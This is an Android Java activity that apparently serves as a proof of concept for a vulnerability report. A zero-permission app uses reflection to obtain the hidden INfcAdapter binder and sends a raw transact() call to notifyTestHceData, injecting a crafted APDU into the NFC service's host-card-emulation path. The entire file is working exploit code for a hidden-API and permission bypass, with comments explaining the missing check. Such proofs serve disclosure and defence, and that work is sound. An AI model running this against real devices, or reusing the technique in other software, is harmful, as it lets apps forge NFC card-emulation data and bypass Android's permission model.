package com.vrp.zeroperm;

import android.app.Activity;
import android.content.Context;
import android.nfc.NfcAdapter;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

import java.lang.reflect.Method;

// com.google.android.nfc's NfcService.NfcAdapterService (the INfcAdapter.Stub implementation)
// exposes notifyTestHceData(int handle, byte[] data) with NO visible permission check in its
// onTransact/method body (unlike ~90% of sibling AIDL methods on the same interface, which call
// NfcPermissions.enforceUserPermissions()/enforceAdminPermissions()/checkPackage()). Its body is
// literally `NfcService.this.onHostCardEmulationData(i, bArr)` -- the SAME internal entry point
// real hardware-triggered HCE (Host Card Emulation) events use when an external NFC reader sends
// APDU data to whichever app currently has an active card-emulation service. This probes whether
// a zero-permission app can reach it via NfcAdapter.getDefaultAdapter() (public, no permission)
// + reflection to reach the hidden INfcAdapter binder + raw Parcel/transact() (bypassing the
// hidden-API-blocked INfcAdapter interface type itself, same technique as the ODP finding).
public class NfcHceInjectActivity extends Activity {
    private static final String T = "NFC_HCE_INJECT";
    private static final String IFACE = "android.nfc.INfcAdapter";
    private static final int TRANSACTION_notifyTestHceData = 50;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== NFC notifyTestHceData() zero-permission injection attempt ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " (ZERO permissions)");

        try {
            NfcAdapter adapter = NfcAdapter.getDefaultAdapter(getApplicationContext());
            Log.w(T, "getDefaultAdapter() -> " + adapter);
            if (adapter == null) {
                Log.w(T, "[-] No NfcAdapter (no NFC hardware or disabled)");
                return;
            }

            Method getServiceMethod = NfcAdapter.class.getMethod("getService");
            Object serviceProxy = getServiceMethod.invoke(null);
            Log.w(T, "NfcAdapter.getService() via reflection -> " + serviceProxy);
            if (serviceProxy == null) {
                Log.w(T, "[-] getService() returned null");
                return;
            }

            Method asBinderMethod = serviceProxy.getClass().getMethod("asBinder");
            IBinder binder = (IBinder) asBinderMethod.invoke(serviceProxy);
            Log.w(T, "[!!!] Got raw IBinder with ZERO permissions: " + binder);
            Log.w(T, "  interface desc=" + binder.getInterfaceDescriptor());

            // Craft a fake incoming APDU (SELECT AID command, a benign but recognizable APDU
            // header) to prove arbitrary attacker-controlled bytes reach onHostCardEmulationData().
            byte[] fakeApdu = new byte[]{
                (byte) 0x00, (byte) 0xA4, (byte) 0x04, (byte) 0x00,
                (byte) 0x07, (byte) 0xF0, (byte) 0x01, (byte) 0x02,
                (byte) 0x03, (byte) 0x04, (byte) 0x05, (byte) 0x06
            };
            int fakeHandle = 0;

            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(IFACE);
                data.writeInt(fakeHandle);
                data.writeByteArray(fakeApdu);
                boolean ok = binder.transact(TRANSACTION_notifyTestHceData, data, reply, 0);
                reply.setDataPosition(0);
                int avail = reply.dataAvail();
                Log.w(T, "transact()=" + ok + " replyAvail=" + avail);
                if (avail > 0) {
                    int exc = reply.readInt();
                    Log.w(T, "  exceptionCode=" + exc + " (0 header present but no payload is unusual; nonzero = real exception was thrown server-side, e.g. -1=SecurityException)");
                } else {
                    Log.w(T, "  [!!!!!] No exception header in reply -- notifyTestHceData() executed without throwing, with ZERO permissions.");
                }
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            Log.w(T, "Failed: " + e, e);
        }
    }
}
